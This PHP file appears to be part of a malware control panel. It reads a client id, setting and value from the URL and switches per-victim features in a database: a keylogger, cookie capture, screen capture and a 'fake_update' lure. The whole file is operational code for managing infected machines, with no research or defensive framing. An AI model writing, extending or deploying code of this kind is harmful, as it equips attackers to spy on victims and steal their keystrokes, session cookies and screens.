<?php
require_once ('includes/functions.php');
$login = new Login();
$template = new Template();
if (!$login->loggedIn()) {
$template->showLogin();
}



$clientId = $_GET["id"];
$setting = $_GET["setting"];
$value = $_GET["value"];


if(!empty($clientId) && !empty($value) && !empty($setting)){

$db->bindMore(array(
    "client_id" => $clientId,
    "value" => $value,
));

switch ($setting) {
    case "keylogger":
        $db->query("UPDATE clients SET keylogger = :value WHERE client_id = :client_id");
        break;
    case "cookies":
        $db->query("UPDATE clients SET cookies = :value WHERE client_id = :client_id");
        break;
    case "screen_capture":
        $db->query("UPDATE clients SET screen_capture = :value WHERE client_id = :client_id");
        break;
    case "fake_update":
        $db->query("UPDATE clients SET fake_update = :value WHERE client_id = :client_id");
        break;
    case "no_payload":
        header("Location: settings.php?cid=".$clientId);
        break;
}

redirect("index",3);
$template->showMessage("Option has been changed.", "Changed option");

} else {
	die("error");
}



$template->showHeader("Dashboard");
$template->showIndex($data);
$template->showFooter();
?>